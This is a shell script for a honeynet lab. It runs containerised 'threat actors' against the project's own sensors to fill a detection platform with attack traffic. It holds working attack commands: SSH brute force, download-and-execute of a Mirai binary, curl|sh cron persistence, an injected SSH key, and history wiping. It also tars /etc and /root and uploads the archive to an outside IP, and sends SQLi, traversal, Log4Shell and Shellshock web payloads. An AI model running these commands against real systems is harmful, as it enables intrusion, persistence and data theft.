#!/usr/bin/env bash
#
# populate_lab.sh — drive REAL, varied attack traffic at the honeynet sensors so
# the platform fills with genuine data: telemetry, detections, incidents, MITRE
# technique records, attacker profiles and logs. Nothing here injects into the
# API — every event is a real TCP session a sensor captured.
#
#   ./scripts/populate_lab.sh [waves]      # default 2
#
# Each "threat actor" runs in its own throwaway container on honeynet_edge, so
# the sensors see a distinct real source IP per actor and the correlation engine
# builds one incident per actor. Containers are removed on exit.

set -uo pipefail
cd "$(dirname "$0")/.."

WAVES="${1:-2}"
EDGE_NET="honeynet_edge"
IMG="st-attacker:latest"
COWRIE="honeynet_cowrie"; DIONAEA="honeynet_dionaea"; HONEYTRAP="honeynet_honeytrap"
SSH_P=2222; TELNET_P=2223; SMB_P=445; MSSQL_P=1433; FTP_P=2121; HTTP_P=8022; HTTP2_P=8023

command -v docker >/dev/null || { echo "docker not found" >&2; exit 1; }
docker image inspect "$IMG" >/dev/null 2>&1 || docker build -q -t "$IMG" scripts/attacker/ >/dev/null
docker network inspect "$EDGE_NET" >/dev/null 2>&1 || { echo "network $EDGE_NET missing — is the stack up?" >&2; exit 1; }

RUNNING=()
cleanup() { for c in "${RUNNING[@]:-}"; do docker rm -f "$c" >/dev/null 2>&1 || true; done; }
trap cleanup EXIT INT TERM

# actor <name> <inline-sh> — launches one attacker container, records it for cleanup.
actor() {
  local name="st-atk-$1-$RANDOM"; shift
  docker run -d --rm --name "$name" --network "$EDGE_NET" "$IMG" "$*" >/dev/null 2>&1 \
    && RUNNING+=("$name") && echo "    + $name"
}

# ── threat-actor definitions ────────────────────────────────────────────────
# Failed-then-accepted passwords: cowrie denies the first list, accepts the rest.
FAIL_PW="123456 password root toor 12345 admin 1234"

mirai_bot() {
  actor mirai '
    for pw in '"$FAIL_PW"'; do sshpass -p "$pw" ssh -p '"$SSH_P"' root@'"$COWRIE"' true 2>/dev/null; done
    sshpass -p oracle ssh -p '"$SSH_P"' oracle@'"$COWRIE"' "
      busybox; cat /proc/mounts; cat /proc/cpuinfo | grep -c processor;
      cd /tmp; wget http://45.9.148.99/bins/mirai.arm7 -O .x; chmod +x .x; ./.x;
      curl http://45.9.148.99/w.sh | sh; rm -rf /tmp/.x" 2>/dev/null
    for i in 1 2 3; do nc -w2 '"$COWRIE"' '"$TELNET_P"' </dev/null; done'
}

hands_on_intruder() {
  actor handson '
    for pw in '"$FAIL_PW"'; do sshpass -p "$pw" ssh -p '"$SSH_P"' root@'"$COWRIE"' true 2>/dev/null; done
    sshpass -p letmein ssh -p '"$SSH_P"' root@'"$COWRIE"' "
      whoami; id; uname -a; hostname; cat /etc/passwd; cat /etc/shadow;
      ls -la /root; cat /root/.bash_history; netstat -antp; ps aux;
      crontab -l; echo \"*/5 * * * * curl -s http://45.9.148.99/c | sh\" | crontab -;
      mkdir -p /root/.ssh; echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7attacker\" >> /root/.ssh/authorized_keys;
      chattr +i /root/.ssh/authorized_keys; history -c; rm -f /root/.bash_history" 2>/dev/null'
}

exfil_actor() {
  actor exfil '
    sshpass -p raspberry ssh -p '"$SSH_P"' root@'"$DIONAEA"' true 2>/dev/null
    sshpass -p raspberry ssh -p '"$SSH_P"' root@'"$COWRIE"' "
      find / -name \"*.sql\" -o -name \"*.pem\" -o -name id_rsa 2>/dev/null;
      grep -r password /etc 2>/dev/null | head;
      tar czf /tmp/loot.tgz /etc /root /var/log 2>/dev/null;
      curl -T /tmp/loot.tgz http://185.220.101.5/upload/loot.tgz;
      scp /tmp/loot.tgz exfil@185.220.101.5:/data/; rm -f /tmp/loot.tgz" 2>/dev/null'
}

recon_scanner() {
  actor recon '
    for r in 1 2 3; do
      nmap -sT -Pn -T4 -p '"$SSH_P"','"$TELNET_P"','"$SMB_P"','"$MSSQL_P"','"$FTP_P"','"$HTTP_P"','"$HTTP2_P"',22,23,80,443,3306,3389,8080,9200,6379,5900,53,161 '"$COWRIE"' '"$DIONAEA"' '"$HONEYTRAP"' 2>/dev/null | tail -3
      for p in 21 22 23 25 80 110 143 443 445 993 1433 2222 3306 3389 5432 5900 6379 8080 8443 9200; do
        nc -z -w1 '"$DIONAEA"' $p 2>/dev/null; nc -z -w1 '"$HONEYTRAP"' $p 2>/dev/null; done
      sleep 3
    done'
}

web_attacker() {
  local paths='/ /admin /wp-login.php /.env /.git/config /phpinfo.php
    /?id=1%27%20OR%20%271%27=%271 /?q=%3Cscript%3Ealert(1)%3C/script%3E
    /../../../../../../etc/passwd /index.php?page=../../../../etc/passwd
    /cgi-bin/test.cgi /api/v1/users?filter[]=1)%20UNION%20SELECT%20*%20FROM%20users--
    /solr/admin/cores?action=CREATE /struts2-showcase/'
  actor web "
    for port in $HTTP_P $HTTP2_P; do
      for u in $paths; do
        curl -s -o /dev/null -m 5 -A 'sqlmap/1.7#{jndi:ldap://45.9.148.99/a}' \"http://$HONEYTRAP:\$port\$u\"
        curl -s -o /dev/null -m 5 -H 'User-Agent: () { :;}; /bin/bash -c \"id\"' \"http://$HONEYTRAP:\$port\$u\"
      done
    done"
}

dionaea_hunter() {
  actor dionaea "
    for r in 1 2 3 4; do
      for p in $SMB_P $MSSQL_P; do
        printf '\\x00\\x00\\x00\\x2f\\xff\\x53\\x4d\\x42\\x72\\x00\\x00\\x00\\x00' | nc -w2 $DIONAEA \$p
      done
      { printf 'USER anonymous\\r\\n'; sleep 1; printf 'PASS a@b.c\\r\\n'; sleep 1; printf 'SYST\\r\\n'; printf 'LIST\\r\\n'; sleep 1; printf 'RETR /etc/passwd\\r\\n'; } | nc -w4 $DIONAEA $FTP_P
      sleep 2
    done"
}

slow_brute() {
  actor slowbrute '
    for u in admin test user git postgres mysql ftp www-data jenkins deploy support pi; do
      for pw in $u 123456 password $u123 changeme; do
        sshpass -p "$pw" ssh -p '"$SSH_P"' "$u@'"$COWRIE"'" true 2>/dev/null
      done
    done
    for u in admin root support; do nc -w2 '"$COWRIE"' '"$TELNET_P"' <<EOT 2>/dev/null
$u
$u
EOT
    done'
}

wave() {
  echo "==> wave $1/$WAVES  ($(date +%H:%M:%S))"
  mirai_bot; hands_on_intruder; exfil_actor; recon_scanner
  web_attacker; dionaea_hunter; slow_brute
  echo "    waiting for actors to finish..."
  local deadline=$(( $(date +%s) + 150 ))
  while [ "$(date +%s)" -lt "$deadline" ]; do
    local live=0
    for c in "${RUNNING[@]:-}"; do docker ps -q -f name="^${c}$" | grep -q . && live=$((live+1)); done
    [ "$live" -eq 0 ] && break
    sleep 5
  done
  RUNNING=()
  echo "    wave $1 done"
}

echo "Populating the honeynet with real attack traffic — $WAVES wave(s)."
for w in $(seq 1 "$WAVES"); do
  wave "$w"
  [ "$w" -lt "$WAVES" ] && { echo "    cooldown 25s (lets the detection engine correlate)"; sleep 25; }
done

echo
echo "Done. The collector ingests within ~1s and the detection engine runs on new"
echo "telemetry immediately. Give it ~30s, then check the dashboard / Event Log /"
echo "Investigations / MITRE Matrix."
